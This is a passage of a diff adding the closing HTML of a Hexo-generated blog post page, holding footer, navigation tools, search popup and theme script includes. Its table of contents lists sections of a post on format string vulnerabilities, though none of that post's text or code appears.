href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">参考资料</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+        &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2025
+        
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">arch3rn4r</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">78.1k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools left-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+            <li class="tools-item rss flex-center">
+                <a class="flex-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                    <i class="fas fa-rss"></i>
+                </a>
+            </li>
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-text">介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="nav-text">格式化字符串漏洞的条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0"><span class="nav-text">其他格式化字符串函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F"><span class="nav-text">内存泄漏</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E6%A0%88%E5%9C%B0%E5%9D%80"><span class="nav-text">泄露栈地址</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1"><span class="nav-text">拒绝服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E8%A6%86%E7%9B%96%EF%BC%88%E5%86%99%E5%85%A5%E6%95%B0%E6%8D%AE%EF%BC%89"><span class="nav-text">内存覆盖（写入数据）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E6%96%B9%E6%B3%95"><span class="nav-text">其他方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">参考资料</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/header-shrink.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/back2top.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/toggle-theme.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/code-block.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/main.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/libs/anime.min.js"></script>
+
+<!-- local search -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/local-search.min.js"></script>
+
+
+<!-- lazyload -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/lazyload.min.js"></script>
+
+
+<div class="">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/post/post-helper.min.js"></script>
+
+        <!-- toc -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/post/toc.min.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/post/copyright-info.min.js"></script>
+        
+
+        <!-- share -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/post/share.min.js"></script>
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+    
+        
+    
+
+</body>
+</html>
